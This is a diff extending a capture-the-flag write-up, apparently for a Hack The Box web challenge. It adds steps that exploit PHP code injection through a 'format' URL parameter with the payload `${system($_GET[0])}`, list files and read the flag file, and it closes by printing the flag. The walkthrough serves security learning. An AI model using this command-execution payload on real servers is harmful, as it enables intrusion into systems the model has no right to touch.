@@ -124,7 +124,55 @@ https://www.programmersought.com/article/30723400042/
 http://www.securityidiots.com/Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html
 ```
 
-17. When we add `${system("ls")}` as the format value won't do anything, based from the article we 
+17. When i add `${system("ls")}` as the format value, obviously it won't do anything.
+18. Based from the article i read, we can utilize the GET parameter. Since %_GET is a dictionary, the key can be a number, hence we can add the 2nd parameter to be `anynum` equal to cat, ls, etc.
+19. So our  shall look like this:
+
+```php
+${system($_GET[0])}&0=ls
+```
+
+> COMPLETE URL
+
+```
+http://178.62.88.144:30462/?format=${system($_GET[0])}&0=ls+--+/
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/208931342-4fc7e15f-6190-4a02-93dd-04c6cc8da9ba.png)
+
+
+20. Notice there's a flag file (?)
+
+![image](https://user-images.githubusercontent.com/70703371/208931609-92b0f8d3-ba30-47b8-adb9-fe2da131f767.png)
+
+
+21. Let's cat the file.
+
+```php
+${system($_GET[0])}&0=cat+/flagtERAM+--+/
+```
+
+> COMPLETE URL
+
+```
+http://178.62.88.144:30462/?format=${system($_GET[0])}&0=cat+/flagtERAM+--+/
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/208932048-6effbed6-c242-4869-b2e3-f9afbd4840a2.png)
+
+
+22. Got the flag!
+
+
+## FLAG
+
+```
+HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
+```
 
 
 ## LEARNING REFERENCES
